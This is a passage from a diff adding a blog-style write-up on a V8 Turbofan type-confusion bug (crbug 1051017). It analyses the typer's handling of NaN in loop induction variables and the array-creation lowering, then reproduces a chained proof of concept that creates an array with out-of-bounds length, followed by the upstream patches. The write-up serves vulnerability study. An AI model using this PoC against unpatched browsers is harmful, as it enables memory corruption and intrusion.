+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">kind</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">kStrict</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">bound_min</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">min</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="nf">max</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">bound_min</span> <span class="o">+</span> <span class="n">increment_min</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// The lower bound must be at most the initial value&#39;s lower bound.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">min</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="nf">min</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">initial_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Shortcut: If the increment can be both positive and negative,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// the variable can go arbitrarily far, so just return integer.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">Type</span><span class="o">::</span><span class="nf">Range</span><span class="p">(</span><span class="n">min</span><span class="p">,</span> <span class="n">max</span><span class="p">,</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="nf">zone</span><span class="p">());</span></span></span></code></pre></div>
+The comments provided in the source are self-explanatory. Upper and lower bounds get calculated if and only if <code>-increment_type.Max() &gt;= 0</code> or  <code>increment_type.Max() &lt;= 0</code> holds for subtraction or addition arithmetic operations accordingly. Otherwise, a <code>kInteger</code> type gets returned.</p>
+<h3 id="triggering-a-type-confusion">Triggering A Type Confusion<a href="#triggering-a-type-confusion" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>A type confusion vulnerability can be caused by a logical bug in the implementation of <code>TypeInductionVariablePhi</code> as this function does not take into account if the type of <code>increment_type</code> can become <code>NaN</code> through addition or subtraction of
+Infinities during the execution of the for-loop, having the initial value of <code>initial_type</code> not being Infinity.</p>
+<p>In order to understand the way to trigger this vulnerability, let&rsquo;s take a similar PoC as the one provided in the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug issue</a> :</p>
+<p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">trigger</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">trigger</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">trigger</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">trigger</span><span class="p">();</span></span></span></code></pre></div>
+In this scenario, we will have the following:</p>
+<ul>
+<li><code>initial_type</code>: i = 0.</li>
+<li><code>increment_type</code>: i += -Infinity.</li>
+<li><code>arithmetic_type</code>: arithmetic type will be of type addition.</li>
+</ul>
+<p>This configuration will be ultimately interpreted as follows:</p>
+<ul>
+<li><code>both_types_integer</code> = <code>true</code>:
+<ul>
+<li>0 is of type <code>kInteger</code>, as it falls within <code>Range(-V8_INFINITY, V8_INFINITY);</code></li>
+<li><code>-Infinity</code> is also of type <code>kInteger</code> as it falls within <code>Range(-V8_INFINITY, V8_INFINITY);</code></li>
+</ul>
+</li>
+<li><code>maybe_nan</code> = <code>false</code>:
+<ul>
+<li>as 0 + <code>-Infinity</code> = <code>-Infinity</code>, which is of type <code>kInteger</code></li>
+</ul>
+</li>
+<li>(<code>increment_min</code> &gt;= 0) == <code>false</code>:
+<ul>
+<li><code>increment_min</code> value will be <code>-Infinity</code></li>
+</ul>
+</li>
+</ul>
+<p>Therefore, <code>TypeInductionVariablePhi</code> for this case scenario will return a type of <code>kInteger</code>. However, that is only correct for the first iteration of the loop. But the loop will execute for a total of 3 iterations. The following would be the values for <code>initial_type</code> and <code>increment_type</code> per iteration:</p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th>First iteration</th>
+          <th>Second iteration</th>
+          <th>Third iteration</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>i</strong></td>
+          <td>0</td>
+          <td>-Infinity</td>
+          <td>NaN</td>
+      </tr>
+      <tr>
+          <td><strong>i += m</strong></td>
+          <td>-Infinity</td>
+          <td>+Infinity</td>
+          <td>-</td>
+      </tr>
+  </tbody>
+</table>
+<p>Therefore, for this specific for-loop instance Turbofan would infer <code>i</code> to be of type <code>kInteger</code>, being <code>Range(-V8_INFINITY, V8_INFINITY);</code> When in reality after the execution of the loop, <code>i</code> will be of type <code>NaN</code>, therefore leading to type confusion. This wrong type inference can be observed by analyzing the Turbofan&rsquo;s Typer phase with Turbolizer:</p>
+<p><img src="//2021-12-30-134638_948x785_scrot.png#center" alt=""></p>
+<h3 id="reducejscreatearray-analysis">ReduceJSCreateArray Analysis<a href="#reducejscreatearray-analysis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>In conjunction with the previous vulnerability, there is an additional fault that enables this bug to be exploitable. This fault resides in the implementation of <code>JSCreateLowering::ReduceJSCreateArray</code>  held in <code>compiler/js-create-lowering.cc</code>.
+The function <code>ReduceJSCreateArray</code> is in charge of the optimization of constructed arrays.
+For sake of simplicity, the only relevant portion of this function to enable exploitation will be covered. That is the following code within <code>ReduceJSCreateArray</code> implementation:</p>
+<p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">arity</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Node</span><span class="o">*</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">ZeroConstant</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">capacity</span> <span class="o">=</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">kPreallocatedArrayElements</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">capacity</span><span class="p">,</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span> <span class="n">elements_kind</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">allocation</span><span class="p">,</span> <span class="n">slack_tracking_prediction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">arity</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Node</span><span class="o">*</span> <span class="n">length</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="nf">GetValueInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Type</span> <span class="n">length_type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="nf">GetType</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">length_type</span><span class="p">.</span><span class="nf">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="nf">Number</span><span class="p">()))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// Handle the single argument case, where we know that the value
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// cannot be a valid Array length.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">elements_kind</span> <span class="o">=</span> <span class="nf">GetMoreGeneralElementsKind</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">          <span class="n">elements_kind</span><span class="p">,</span> <span class="nf">IsHoleyElementsKind</span><span class="p">(</span><span class="n">elements_kind</span><span class="p">)</span> <span class="o">?</span> <span class="nl">HOLEY_ELEMENTS</span>
+</span></span><span class="line"><span class="cl">                                                            <span class="p">:</span> <span class="n">PACKED_ELEMENTS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nf">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">Node</span><span class="o">*&gt;</span><span class="p">{</span><span class="n">length</span><span class="p">},</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">elements_kind</span><span class="p">,</span> <span class="n">allocation</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">slack_tracking_prediction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">length_type</span><span class="p">.</span><span class="nf">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="nf">SignedSmall</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="n">length_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">length_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">()</span> <span class="o">&lt;=</span> <span class="n">kElementLoopUnrollLimit</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">length_type</span><span class="p">.</span><span class="nf">Min</span><span class="p">()</span> <span class="o">==</span> <span class="n">length_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">capacity</span> <span class="o">=</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">length_type</span><span class="p">.</span><span class="nf">Max</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nf">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">capacity</span><span class="p">,</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span> <span class="n">elements_kind</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">allocation</span><span class="p">,</span> <span class="n">slack_tracking_prediction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">length_type</span><span class="p">.</span><span class="nf">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="nf">UnsignedSmall</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="n">can_inline_call</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nf">ReduceNewArray</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="o">*</span><span class="n">initial_map</span><span class="p">,</span> <span class="n">elements_kind</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">allocation</span><span class="p">,</span> <span class="n">slack_tracking_prediction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">arity</span> <span class="o">&lt;=</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">kInitialMaxFastElementArray</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Gather the values to store into the newly created array.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">...</span></span></span></code></pre></div>
+As we can observe, depending on the number of arguments (arity) passed to the array constructor, different code-paths will be chosen. Ultimately, the effect of these code-paths based on the value of <code>arity</code> will be the following:</p>
+<ul>
+<li><strong>If <code>arity</code> is 0</strong>
+<ul>
+<li>length = 0</li>
+<li>capacity = <code>JSArray::kPreallocatedArrayElements</code></li>
+</ul>
+</li>
+<li><strong>If <code>arity</code> is 1</strong>
+<ul>
+<li>length = <code>NodeProperties::GetValueInput(node, 2)</code></li>
+<li>if <code>length_type</code> != <code>Number</code>
+<ul>
+<li>capacity = <code>undefined</code></li>
+</ul>
+</li>
+<li>if <code>length_type</code> == <code>SignedSmall</code> and <code>length_type</code> &lt;= <code>kElementLoopUnrollLimit</code>
+<ul>
+<li>capacity = <code>length_type.Max()</code></li>
+</ul>
+</li>
+<li>else
+<ul>
+<li>capacity = <code>undefined</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>else if <code>arity</code> &lt;= <code>JSArray::kINiitalMaxFastElementArray</code></strong>:
+<ul>
+<li>iterate through arguments, compute length and create new array</li>
+</ul>
+</li>
+<li><strong>else</strong>:
+<ul>
+<li>return <code>NoChange()</code></li>
+</ul>
+</li>
+</ul>
+<p>We can observe based on the previous resumed overview of the implementation of <code>ReduceJSCreateArray</code> that if one argument is passed to the constructor, and that argument falls within the range of 0 &lt;= <code>length_type</code> &lt;= <code>kElementLoopUnrollLimit</code>, a new array will be created having its capacity initialized as <code>length_type.Max()</code>. The value of <code>kElementLoopUnrollLimit</code> is the following:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// When initializing arrays, we&#39;ll unfold the loop if the number of
+</span></span></span><span class="line"><span class="cl"><span class="c1">// elements is known to be of this type.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">const</span> <span class="kt">int</span> <span class="n">kElementLoopUnrollLimit</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span></span></span></code></pre></div>Therefore, by following this path we can abuse the creation of an array with OOB indexed property access, as the upper bounds of the newly created array will be set to  <code>lenght_type.Max()</code>.</p>
+<h3 id="exploitation">Exploitation<a href="#exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>The PoC provided in the crbug issue shows how we can chain these two vulnerabilities to abuse the speculation of a wrongly assumed type inference. This PoC is the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="nx">k</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(-Inf, Inf) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(1024, Inf) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(-Inf, -1024) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(-1025, -1024) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                 
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(1024, 1025) -- reality: i = 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(2, 3) -- reality: i = -1022 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(1, 1) -- reality: i = 1073741313 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>               
+</span></span><span class="line"><span class="cl">  <span class="c1">// inference: i = Range(11, 11) -- reality: i = 1073741323 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>      
+</span></span><span class="line"><span class="cl">  <span class="c1">// capacity = 11, length = 1073741323 (OOB)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20000</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">trigger</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">trigger</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="mi">11</span><span class="p">]);</span></span></span></code></pre></div>
+<h3 id="mitigation">Mitigation<a href="#mitigation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>After the report of this vulnerability, the following patches were applied. Is important to understand the scope of these patches as this would be relevant for the analysis and solution of Modern Typer.</p>
+<h4 id="patch-applied-to-jscreateloweringreducejscreatearray">Patch applied to <a href="https://chromium.googlesource.com/v8/v8/+/6516b1ccbe6f549d2aa2fe24510f73eb3a33b41a%5E%21/#F0">JSCreateLowering::ReduceJSCreateArray</a><a href="#patch-applied-to-jscreateloweringreducejscreatearray" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
+</span></span></span><span class="line"><span class="cl"><span class="gh">index ff057a4..77da973 100644
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/js-create-lowering.cc
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/js-create-lowering.cc
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -672,6 +672,9 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>         length_type.Max() &lt;= kElementLoopUnrollLimit &amp;&amp;
+</span></span><span class="line"><span class="cl">         length_type.Min() == length_type.Max()) {
+</span></span><span class="line"><span class="cl">       int capacity = static_cast&lt;int&gt;(length_type.Max());
+</span></span><span class="line"><span class="cl"><span class="gi">+      // Replace length with a constant in order to protect against a potential
+</span></span></span><span class="line"><span class="cl"><span class="gi">+      // typer bug leading to length &gt; capacity.
+</span></span></span><span class="line"><span class="cl"><span class="gi">+      length = jsgraph()-&gt;Constant(capacity);
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
+</span></span><span class="line"><span class="cl">                             allocation, slack_tracking_prediction);
+</span></span><span class="line"><span class="cl">     }
+</span></span></code></pre></div>
+<h4 id="patch-applied-to--typertypeinductionvariablephi">Patch applied to <a href="https://chromium.googlesource.com/v8/v8/+/a2e971c56d1c46f7c71ccaf33057057308cc8484%5E%21/#F1"> Typer::TypeInductionVariablePhi</a><a href="#patch-applied-to--typertypeinductionvariablephi" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+</span></span></span><span class="line"><span class="cl"><span class="gh">index 14ec856..4e86b96 100644
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/typer.cc
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/typer.cc
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -847,30 +847,24 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());
+</span></span><span class="line"><span class="cl">   DCHECK_EQ(2, NodeProperties::GetControlInput(node)-&gt;InputCount());
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="gd">-  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  DCHECK(res != induction_vars_-&gt;induction_variables().end());
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  InductionVariable* induction_var = res-&gt;second;
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span>   Type initial_type = Operand(node, 0);
+</span></span><span class="line"><span class="cl">   Type increment_type = Operand(node, 2);
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="gd">-  const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;
+</span></span></span><span class="line"><span class="cl"><span class="gd">-                                  increment_type.Is(typer_-&gt;cache_-&gt;kInteger);
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  bool maybe_nan = false;
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  // The addition or subtraction could still produce a NaN, if the integer
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  // ranges touch infinity.
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  if (both_types_integer) {
+</span></span></span><span class="line"><span class="cl"><span class="gd">-    Type resultant_type =
+</span></span></span><span class="line"><span class="cl"><span class="gd">-        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
+</span></span></span><span class="line"><span class="cl"><span class="gd">-            ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)
+</span></span></span><span class="line"><span class="cl"><span class="gd">-            : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,
+</span></span></span><span class="line"><span class="cl"><span class="gd">-                                                        increment_type);
+</span></span></span><span class="line"><span class="cl"><span class="gd">-    maybe_nan = resultant_type.Maybe(Type::NaN());
